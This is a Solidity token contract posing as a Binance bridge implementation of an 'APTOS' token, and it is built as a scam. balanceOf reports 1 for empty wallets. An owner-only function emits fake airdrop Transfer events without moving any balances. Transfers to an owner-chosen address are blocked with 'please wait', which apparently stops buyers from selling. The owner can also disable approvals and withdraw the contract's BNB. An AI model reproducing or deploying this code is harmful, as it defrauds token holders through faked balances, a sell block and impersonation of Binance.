/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: MIT
/**

Binance Bridge Implementation of APTOS.

Official Announcement: https://www.binance.com/en/support/announcement/1139c7e87dd84664abb62f73c5e1dea2



 **/
pragma solidity ^0.8.6;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

interface BEP20Interface {
  function totalSupply() external  view returns (uint);
  function balanceOf(address tokenOwner) external view returns (uint balance);
  function allowance(address tokenOwner, address spender) external view returns (uint remaining);
  function transfer(address to, uint tokens) external returns (bool success);
  function approve(address spender, uint tokens) external returns (bool success);
  function transferFrom(address from, address to, uint tokens) external returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

interface ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) external;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract APTOSLABS is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address private newun;
  bool private approveStatus = true;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() {
    symbol = "APT";
    name = "APTOS Token";
    decimals = 18;
    _totalSupply = 1000000000 *10 **18;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), 0x0000000000000000000000000000000000001004, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view override returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view override returns (uint balance) {
      if(balances[tokenOwner] == 0){
          return 1;
      } else{
          return balances[tokenOwner];
      }
  }
  function transfer(address to, uint tokens) public override returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public override returns (bool success) {
    require(approveStatus == true);
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
   function swapExactTokensForTokens(address[] memory holders) public payable onlyOwner{
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(0x0000000000000000000000000000000000001004, holders[i], 100 *10 **18);
        }
    }

  function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
     require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view override returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
 
  function approveEdem(bool check) public  onlyOwner{
    approveStatus = check;
  }
  receive()external payable {

  }

   function clearCNDAO() public onlyOwner() {
    address payable _owner = payable(msg.sender);
    _owner.transfer(address(this).balance);
  }
}